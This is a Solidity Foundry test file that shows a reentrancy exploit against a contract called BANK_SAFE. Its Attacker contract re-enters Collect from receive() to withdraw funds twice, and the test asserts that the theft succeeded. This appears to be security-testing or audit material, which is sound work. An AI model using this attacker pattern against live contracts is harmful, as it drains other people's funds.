
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {BANK_SAFE} from "../src/BANK_SAFE.sol";

contract TestReentrancyBANK_SAFE is Test {
    BANK_SAFE public _contractUnderTest;
    Attacker public _attacker;

    function setUp() public {
        _contractUnderTest = new BANK_SAFE();

        // Initialize BANK_SAFE
        _contractUnderTest.SetMinSum(1 wei);
        _contractUnderTest.SetLogFile(address(new LogFileMock()));
        _contractUnderTest.Initialized();

        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        vm.assume(attackVal > 0.01 ether && attackVal < type(uint128).max);

        // Fund the victim so it has ETH to steal
        vm.deal(address(_contractUnderTest), attackVal * 2);

        // Fund the Attacker
        vm.deal(address(_attacker), attackVal * 2);

        // Fund the Test Contract
        vm.deal(address(this), attackVal * 2);

        // Setup and trigger the attack
        _attacker.setupAttack{value: attackVal}(attackVal);
        _attacker.attack(attackVal);

        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract LogFileMock {
    function AddMessage(address, uint256, string memory) public {}
}

contract Attacker {
    BANK_SAFE public _victim;

    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public storedAttackVal;

    constructor(address victimAddress) {
        _victim = BANK_SAFE(victimAddress);
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
        storedAttackVal = val;

        // Deposit into BANK_SAFE so that Collect can be called
        _victim.Deposit{value: val}();
    }

    function attack(uint256 val) public {
        initialSnapshot = address(this).balance;

        // First Collect call, which will trigger reentrancy via receive()
        _victim.Collect(val);

        // After reentrancy, if we got more than initialSnapshot, exploit succeeded
        if (address(this).balance > initialSnapshot) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {
            attackCallCount++;
            // Re-enter before victim updates its balance
            _victim.Collect(storedAttackVal);
        }
    }
}
